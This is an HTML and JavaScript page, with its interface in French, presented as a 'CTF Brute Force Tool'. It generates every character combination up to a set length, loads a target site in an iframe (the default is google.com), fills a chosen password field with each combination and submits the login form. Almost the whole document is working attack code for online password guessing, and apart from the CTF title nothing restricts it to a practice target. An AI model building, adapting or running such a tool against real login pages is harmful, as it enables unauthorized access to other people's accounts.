<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CTF Brute Force Tool</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0d1117;
            color: #58a6ff;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }
        
        h1 {
            text-align: center;
            color: #f0f6fc;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #58a6ff;
        }
        
        .controls {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .input-group {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        
        label {
            color: #f0f6fc;
            font-weight: bold;
        }
        
        input, select, textarea {
            padding: 8px;
            border: 1px solid #30363d;
            border-radius: 4px;
            background: #0d1117;
            color: #f0f6fc;
            font-family: inherit;
        }
        
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #58a6ff;
            box-shadow: 0 0 5px rgba(88, 166, 255, 0.3);
        }
        
        .button-group {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }
        
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            font-family: inherit;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn-start {
            background: #238636;
            color: white;
        }
        
        .btn-start:hover {
            background: #2ea043;
        }
        
        .btn-stop {
            background: #da3633;
            color: white;
        }
        
        .btn-stop:hover {
            background: #f85149;
        }
        
        .btn-clear {
            background: #6f42c1;
            color: white;
        }
        
        .btn-clear:hover {
            background: #8957e5;
        }
        
        .status {
            text-align: center;
            padding: 10px;
            border-radius: 4px;
            margin: 10px 0;
            font-weight: bold;
        }
        
        .status.running {
            background: rgba(35, 134, 54, 0.2);
            border: 1px solid #238636;
            color: #2ea043;
        }
        
        .status.stopped {
            background: rgba(218, 54, 51, 0.2);
            border: 1px solid #da3633;
            color: #f85149;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }
        
        .stat-card {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 4px;
            padding: 10px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 1.5em;
            font-weight: bold;
            color: #58a6ff;
        }
        
        .stat-label {
            color: #8b949e;
            font-size: 0.9em;
        }
        
        .target-input {
            grid-column: 1 / -1;
        }
        
        #targetElement {
            width: 100%;
            min-height: 60px;
            resize: vertical;
        }
        
        .log {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 4px;
            padding: 15px;
            max-height: 200px;
            overflow-y: auto;
            font-size: 0.9em;
            line-height: 1.4;
        }
        
        .current-attempt {
            color: #f0f6fc;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîì CTF Brute Force Tool</h1>
        
        <div class="controls">
            <div class="input-group">
                <label for="charset">Jeu de caract√®res :</label>
                <input type="text" id="charset" value="azertyuiopqsdfghjklmwxc" placeholder="Caract√®res √† utiliser">
            </div>
            
            <div class="input-group">
                <label for="maxLength">Longueur max :</label>
                <input type="number" id="maxLength" value="4" min="1" max="10">
            </div>
            
            <div class="input-group">
                <label for="delay">D√©lai (ms) :</label>
                <input type="number" id="delay" value="50" min="1" max="5000">
            </div>
            
            <div class="input-group">
                <label for="method">M√©thode :</label>
                <select id="method">
                    <option value="type">Saisie automatique</option>
                    <option value="fill">Remplir champ</option>
                    <option value="submit">Submit form</option>
                </select>
            </div>
            
            <div class="input-group target-input">
                <label for="targetElement">S√©lecteur CSS du champ cible :</label>
                <textarea id="targetElement" placeholder="Ex: #password, input[type='password'], .login-field">#password</textarea>
            </div>
        </div>
        
        <div class="button-group">
            <button class="btn-start" onclick="startBruteForce()">üöÄ D√©marrer</button>
            <button class="btn-stop" onclick="stopBruteForce()">‚èπÔ∏è Arr√™ter</button>
            <button class="btn-clear" onclick="clearLog()">üóëÔ∏è Effacer log</button>
        </div>
        
        <div id="status" class="status stopped">‚è∏Ô∏è Arr√™t√©</div>
        
        <div class="stats">
            <div class="stat-card">
                <div id="attempts" class="stat-value">0</div>
                <div class="stat-label">Tentatives</div>
            </div>
            <div class="stat-card">
                <div id="speed" class="stat-value">0</div>
                <div class="stat-label">Par seconde</div>
            </div>
            <div class="stat-card">
                <div id="currentCombo" class="stat-value">-</div>
                <div class="stat-label">Actuel</div>
            </div>
            <div class="stat-card">
                <div id="elapsed" class="stat-value">00:00</div>
                <div class="stat-label">Temps √©coul√©</div>
            </div>
        </div>
        
        <div class="input-group">
            <label for="targetUrl">URL du site cible :</label>
            <input type="text" id="targetUrl" value="https://www.google.com" placeholder="https://exemple.com">
            <button class="btn-clear" onclick="loadTargetSite()" style="margin-top: 5px;">üì° Charger le site</button>
        </div>
        
        <div id="target-frame" style="margin: 20px 0; border: 2px solid #30363d; border-radius: 8px; height: 400px; overflow: hidden;">
            <div style="text-align: center; padding: 50px; color: #8b949e;">
                Cliquez sur "Charger le site" pour afficher la page cible ici
            </div>
        </div>
        
        <div class="log" id="log">
            <div class="current-attempt">Pr√™t √† d√©marrer le brute force...</div>
            <div>Configuration de l'outil et s√©lection du champ cible n√©cessaires.</div>
        </div>
    </div>

    <script>
        let isRunning = false;
        let currentTimeout;
        let attempts = 0;
        let startTime;
        let currentIndex = [];
        let charset = [];
        let maxLength = 4;
        
        function generateCombinations(charset, maxLen) {
            const combinations = [];
            
            function generate(current, len) {
                if (len === 0) {
                    combinations.push(current);
                    return;
                }
                
                for (let char of charset) {
                    generate(current + char, len - 1);
                }
            }
            
            for (let len = 1; len <= maxLen; len++) {
                generate('', len);
            }
            
            return combinations;
        }
        
        function updateStats() {
            const elapsed = (Date.now() - startTime) / 1000;
            const speed = Math.round(attempts / elapsed);
            
            document.getElementById('attempts').textContent = attempts;
            document.getElementById('speed').textContent = speed || 0;
            document.getElementById('elapsed').textContent = formatTime(elapsed);
        }
        
        function formatTime(seconds) {
            const mins = Math.floor(seconds / 60);
            const secs = Math.floor(seconds % 60);
            return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }
        
        function log(message, isAttempt = false) {
            const logDiv = document.getElementById('log');
            const div = document.createElement('div');
            div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            if (isAttempt) div.className = 'current-attempt';
            
            logDiv.appendChild(div);
            logDiv.scrollTop = logDiv.scrollHeight;
            
            // Garder seulement les 50 derniers logs
            while (logDiv.children.length > 50) {
                logDiv.removeChild(logDiv.firstChild);
            }
        }
        
        function loadTargetSite() {
            const url = document.getElementById('targetUrl').value;
            const frameContainer = document.getElementById('target-frame');
            
            if (!url) {
                alert('Veuillez entrer une URL');
                return;
            }
            
            log(`Chargement du site: ${url}`);
            
            frameContainer.innerHTML = `
                <iframe 
                    id="target-iframe" 
                    src="${url}" 
                    style="width: 100%; height: 100%; border: none;"
                    sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox"
                ></iframe>
            `;
            
            // Attendre le chargement
            const iframe = document.getElementById('target-iframe');
            iframe.onload = function() {
                log('‚úÖ Site charg√© avec succ√®s');
                log('‚ÑπÔ∏è Vous pouvez maintenant tester directement dans la frame ci-dessus');
            };
            
            iframe.onerror = function() {
                log('‚ùå Erreur de chargement - Le site bloque peut-√™tre les iframes');
                frameContainer.innerHTML = `
                    <div style="text-align: center; padding: 50px; color: #f85149;">
                        <div>‚ùå Impossible de charger le site</div>
                        <div style="margin-top: 10px; font-size: 0.9em;">
                            Le site bloque les iframes. Utilisez la m√©thode onglet s√©par√©.
                        </div>
                        <button onclick="openInNewTab()" style="
                            margin-top: 15px;
                            padding: 8px 16px;
                            background: #58a6ff;
                            color: white;
                            border: none;
                            border-radius: 4px;
                            cursor: pointer;
                        ">Ouvrir dans un nouvel onglet</button>
                    </div>
                `;
            };
        }
        
        function openInNewTab() {
            const url = document.getElementById('targetUrl').value;
            window.open(url, '_blank');
            log(`Ouverture de ${url} dans un nouvel onglet`);
            log('‚ÑπÔ∏è Revenez sur cet onglet pour lancer l\'attaque');
        }
        
        async function tryPassword(password) {
            const targetSelector = document.getElementById('targetElement').value;
            const method = document.getElementById('method').value;
            
            try {
                let targetElement;
                
                // Essayer d'abord dans l'iframe int√©gr√©e
                const iframe = document.getElementById('target-iframe');
                if (iframe) {
                    try {
                        targetElement = iframe.contentDocument?.querySelector(targetSelector);
                        if (targetElement) {
                            log(`‚úÖ √âl√©ment trouv√© dans l'iframe: ${targetSelector}`);
                        }
                    } catch (e) {
                        log(`‚ö†Ô∏è Acc√®s iframe bloqu√© (CORS): ${e.message}`);
                    }
                }
                
                // Si pas trouv√© dans l'iframe, essayer dans la page actuelle
                if (!targetElement) {
                    targetElement = document.querySelector(targetSelector);
                    if (targetElement) {
                        log(`‚úÖ √âl√©ment trouv√© dans la page actuelle: ${targetSelector}`);
                    }
                }
                
                // Si toujours pas trouv√©, essayer dans les autres iframes
                if (!targetElement) {
                    const iframes = document.querySelectorAll('iframe');
                    for (let frame of iframes) {
                        try {
                            targetElement = frame.contentDocument?.querySelector(targetSelector);
                            if (targetElement) {
                                log(`‚úÖ √âl√©ment trouv√© dans une iframe: ${targetSelector}`);
                                break;
                            }
                        } catch (e) {
                            // Ignorer les erreurs CORS
                        }
                    }
                }
                
                // Derni√®re tentative : essayer d'acc√©der aux autres onglets (g√©n√©ralement bloqu√©)
                if (!targetElement) {
                    // M√©thode alternative : utiliser postMessage si possible
                    log(`‚ùå √âl√©ment cible non trouv√©: ${targetSelector}`);
                    log(`üí° Suggestions:`);
                    log(`   - V√©rifiez que le s√©lecteur CSS est correct`);
                    log(`   - Le site bloque peut-√™tre les iframes (CORS)`);
                    log(`   - Essayez d'ouvrir le site dans un nouvel onglet et utilisez la console`);
                    return false;
                }
                
                // Appliquer la m√©thode choisie
                switch (method) {
                    case 'type':
                        // Simulation de frappe
                        targetElement.focus();
                        targetElement.value = '';
                        
                        for (let char of password) {
                            targetElement.value += char;
                            targetElement.dispatchEvent(new Event('input', { bubbles: true }));
                            await new Promise(resolve => setTimeout(resolve, 20));
                        }
                        
                        targetElement.dispatchEvent(new Event('change', { bubbles: true }));
                        break;
                        
                    case 'fill':
                        targetElement.focus();
                        targetElement.value = password;
                        targetElement.dispatchEvent(new Event('input', { bubbles: true }));
                        targetElement.dispatchEvent(new Event('change', { bubbles: true }));
                        break;
                        
                    case 'submit':
                        targetElement.focus();
                        targetElement.value = password;
                        targetElement.dispatchEvent(new Event('input', { bubbles: true }));
                        
                        // Chercher et soumettre le formulaire
                        const form = targetElement.closest('form');
                        if (form) {
                            const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]');
                            if (submitBtn) {
                                submitBtn.click();
                            } else {
                                form.dispatchEvent(new Event('submit', { bubbles: true }));
                            }
                        } else {
                            // Essayer avec Entr√©e
                            targetElement.dispatchEvent(new KeyboardEvent('keydown', { 
                                key: 'Enter', 
                                bubbles: true 
                            }));
                        }
                        break;
                }
                
                log(`üîç Test effectu√©: "${password}"`);
                return true;
                
            } catch (error) {
                log(`‚ùå Erreur lors de la tentative "${password}": ${error.message}`);
                return false;
            }
        }
        
        async function startBruteForce() {
            if (isRunning) return;
            
            charset = document.getElementById('charset').value.split('');
            maxLength = parseInt(document.getElementById('maxLength').value);
            const delay = parseInt(document.getElementById('delay').value);
            
            if (charset.length === 0) {
                alert('Veuillez sp√©cifier un jeu de caract√®res');
                return;
            }
            
            isRunning = true;
            attempts = 0;
            startTime = Date.now();
            
            document.getElementById('status').textContent = 'üöÄ En cours...';
            document.getElementById('status').className = 'status running';
            
            log('D√©marrage du brute force...');
            log(`Charset: ${charset.join('')}, Longueur max: ${maxLength}, D√©lai: ${delay}ms`);
            
            const combinations = generateCombinations(charset, maxLength);
            log(`${combinations.length} combinaisons √† tester`);
            
            for (let i = 0; i < combinations.length && isRunning; i++) {
                const password = combinations[i];
                attempts++;
                
                document.getElementById('currentCombo').textContent = password;
                updateStats();
                
                log(`Tentative ${attempts}: "${password}"`, true);
                
                const success = await tryPassword(password);
                if (success) {
                    // V√©rifier le r√©sultat (√† personnaliser selon le CTF)
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
                
                await new Promise(resolve => setTimeout(resolve, delay));
            }
            
            if (isRunning) {
                stopBruteForce();
                log('üèÅ Brute force termin√© - Toutes les combinaisons test√©es');
            }
        }
        
        function stopBruteForce() {
            if (!isRunning) return;
            
            isRunning = false;
            if (currentTimeout) clearTimeout(currentTimeout);
            
            document.getElementById('status').textContent = '‚èπÔ∏è Arr√™t√©';
            document.getElementById('status').className = 'status stopped';
            
            log('üõë Brute force arr√™t√© par l\'utilisateur');
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '<div class="current-attempt">Log effac√© - Pr√™t pour une nouvelle session</div>';
        }
        
        // Mise √† jour des stats toutes les secondes
        setInterval(() => {
            if (isRunning) updateStats();
        }, 1000);
        
        // Raccourcis clavier
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey || e.metaKey) {
                switch (e.key) {
                    case 'Enter':
                        e.preventDefault();
                        if (isRunning) stopBruteForce();
                        else startBruteForce();
                        break;
                    case 'r':
                        e.preventDefault();
                        clearLog();
                        break;
                }
            }
        });
    </script>
</body>
</html>
